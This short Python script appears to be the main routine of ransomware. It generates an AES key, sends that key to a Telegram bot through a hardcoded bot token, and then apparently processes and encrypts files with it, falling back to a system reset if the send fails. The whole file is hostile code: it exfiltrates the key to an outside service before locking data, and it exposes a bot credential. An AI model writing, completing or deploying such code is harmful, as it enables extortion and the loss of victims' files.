from models import aes
from models.utils import System
from models.files import CommonFiles
from models.telegram import Telegram


key = aes.generate_key(32)
client = CommonFiles(aes, key)
telegram = Telegram('6901515780:AAGeZhRhWMSyG124XiA_qiIJHkvN3AIIyo4')


if telegram.sendMessage('', key):
    client.process_files()
else: System.reset()